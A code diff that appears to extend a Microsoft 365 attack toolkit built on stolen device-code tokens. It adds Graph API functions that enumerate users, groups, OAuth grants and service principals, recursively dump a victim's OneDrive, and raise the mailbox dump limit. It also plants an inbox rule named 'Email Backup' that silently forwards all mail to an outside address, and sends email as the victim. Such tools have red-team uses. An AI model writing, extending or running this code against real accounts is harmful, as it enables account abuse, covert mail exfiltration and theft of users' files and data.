@@ -71,7 +71,7 @@ def get_auth(device_code, interval, expires_in):
     print(auth_data['access_token'])
     print('\nRefresh Token:')
     print(auth_data['refresh_token'])
-    print(f"\nTo run AzureHound:\n.\\azurehound -r {auth_data['refresh_token']} -d {token_info['domain']} list -o '{token_info['domain']}.json' ")
+    print(f"\nTo run AzureHound:\n.\\azurehound -r {auth_data['refresh_token']} --tenant {token_info['domain']} list -o '{token_info['domain']}.json' ")
     print("")
     return(auth_data)
 
@@ -122,8 +122,88 @@ def refresh_token_to(auth_data, resource , verbose = True):
         print("")
     return res
 
+def get_users(auth_data) :
+    MAX = 15000
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = f"/users"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    #print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+        'Content-type': "application/json"
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.get(url = ENDPOINT, headers= header)
+    
+     # extracting response text 
+    temp = r.json()
+    res ={'data':[]}
+    res['data'] += temp['value']
+    
+    flag = True
+    
+    # this part might be broken -- need more testing
+    while(flag and len(res['data']) < MAX ):
+        if ('@odata.nextLink' in temp.keys()) :
+            next_url = temp['@odata.nextLink']
+            r_ = requests.get(url = next_url, headers= header)
+            temp  = r_.json()
+            res['data'] += temp['value']
+        else :
+            flag = False
+            break
+
+    return res
+
+def get_groups(auth_data) :
+    MAX = 15000
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = f"/groups"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    #print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+        'Content-type': "application/json"
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.get(url = ENDPOINT, headers= header)
+    
+     # extracting response text 
+    temp = r.json()
+    res ={'data':[]}
+    res['data'] += temp['value']
+    
+    flag = True
+    
+    # this part might be broken -- need more testing
+    while(flag and len(res['data']) < MAX ):
+        if ('@odata.nextLink' in temp.keys()) :
+            next_url = temp['@odata.nextLink']
+            r_ = requests.get(url = next_url, headers= header)
+            temp  = r_.json()
+            res['data'] += temp['value']
+        else :
+            flag = False
+            break
+
+    return res
+
 def dump_owa_mailbox_graph_api(auth_data) :
-    MAX = 500
+    MAX = 3000
     access_token = auth_data['access_token']
     token_info = get_token_data(access_token, verbose = False)
     graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
@@ -166,3 +246,247 @@ def dump_owa_mailbox_graph_api(auth_data) :
     #print(res['mail'])
     #print(len(res['mail']))
     return res, token_info['upn']
+
+def dump_drive_id_graph_api(auth_data, id_) :
+    MAX = 3000
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = f"/me/drive/items/{id_}/children"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    #print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+        'Content-type': "application/json"
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.get(url = ENDPOINT, headers= header)
+    
+     # extracting response text 
+    temp = r.json()
+    res ={'data':[]}
+    res['data'] += temp['value']
+    
+    flag = True
+    
+    # this part might be broken -- need more testing
+    while(flag and len(res['data']) < MAX ):
+        if ('@odata.nextLink' in temp.keys()) :
+            next_url = temp['@odata.nextLink']
+            r_ = requests.get(url = next_url, headers= header)
+            temp  = r_.json()
+            res['data'] += temp['value']
+        else :
+            flag = False
+            break
+
+    return res
+
+def dump_drive_graph_api(auth_data) :
+    MAX = 3000
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = "me/drive/root/children"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    #print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+        'Content-type': "application/json"
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.get(url = ENDPOINT, headers= header)
+    
+     # extracting response text 
+    temp = r.json()
+    res ={'data':[]}
+    res['data'] += temp['value']
+    
+    flag = True
+    
+    # this part might be broken -- need more testing
+    while(flag and len(res['data']) < MAX ):
+        if ('@odata.nextLink' in temp.keys()) :
+            next_url = temp['@odata.nextLink']
+            r_ = requests.get(url = next_url, headers= header)
+            temp  = r_.json()
+            res['data'] += temp['value']
+        else :
+            flag = False
+            break
+            
+    res2 ={'data':[]}
+    for i in res['data'] :
+        if "folder" in i.keys() :
+            if i['folder']['childCount'] > 0 :
+                r = dump_drive_id_graph_api(auth_data, i['id'])
+                res2['data'] += r['data']
+        else:
+            res2['data'].append(i)
+    
+    return res2, token_info['upn']
+
+def owa_inbox_forward(auth_data, name, email) :
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = f"me/mailFolders/inbox/messageRules"
+    # API = f"users/{token_info['upn']}/mailFolders/inbox/messageRules"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    # print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+        'Content-type': "application/json"
+    }
+    
+    data = {    
+        "displayName": "Email Backup",      
+        "sequence": 2,
+        "isEnabled": True,
+        "conditions": {
+            "sentToMe": True
+        },
+        "actions": {
+            "forwardTo": [{
+                "emailAddress": {
+                    "name": f"{name}",
+                    "address": f"{email}"
+                }
+            }],
+            "stopProcessingRules": False
+        }
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.post(url = ENDPOINT, headers= header, json=data)
+    
+    res = r.json()
+
+    return res
+
+def owa_send_email(auth_data, message = None):
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = f"me/sendMail"
+    # API = f"users/{token_info['upn']}/sendMail"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    # print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+        'Content-type': "application/json"
+    }
+    
+    if message is None :
+        message = {
+            "message": {
+                "subject": "Test Email",
+                "body": {
+                    "contentType": "Text",
+                    "content": "This is a test email."
+                },
+                "toRecipients": [
+                    {
+                        "emailAddress": {
+                            "address": "abc@def.com"
+                        }
+                    }],
+                "attachments": [
+                    {
+                        "@odata.type": "#microsoft.graph.fileAttachment",
+                        "name": "attachment.txt",
+                        "contentType": "text/plain",
+                        "contentBytes": "SGVsbG8gV29ybGQh"
+                    }
+                ]
+            },
+            "saveToSentItems": "false"
+        }
+    
+    # sending post request and saving response as response object
+    r  = requests.post(url = ENDPOINT, headers= header, json=message)
+    
+    res = r.json()
+
+    return res
+
+def get_permissions(auth_data):
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = f"/oauth2PermissionGrants"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    # print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.get(url = ENDPOINT, headers= header)
+    
+    # extracting response text 
+    temp = r.json()
+    res ={'data':[]}
+    res['data'] += temp['value']
+    
+    flag = True
+    
+    # this part might be broken -- need more testing
+    while(flag and len(res['data'])):
+        if ('@odata.nextLink' in temp.keys()) :
+            next_url = temp['@odata.nextLink']
+            r_ = requests.get(url = next_url, headers= header)
+            temp  = r_.json()
+            res['data'] += temp['value']
+        else :
+            flag = False
+            break
+
+    return res
+
+def get_service_principal(auth_data, ID = None):
+    if ID is None:
+        print('ID required')
+        return
+    access_token = auth_data['access_token']
+    token_info = get_token_data(access_token, verbose = False)
+    graph_token = refresh_token_to(auth_data, 'ms graph', verbose = False)
+    API_V = "v1.0"
+    API = f"/servicePrincipals/{ID}"
+    ENDPOINT = f"https://graph.microsoft.com/{API_V}/{API}"
+    # print(ENDPOINT)
+    
+    # header
+    header = {
+        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
+        "Authorization": f"Bearer {graph_token['access_token']}",
+        'Content-type': "application/json"
+    }
+    
+    # sending post request and saving response as response object
+    r  = requests.get(url = ENDPOINT, headers= header)
+    
+    # extracting response text 
+    return r.json()
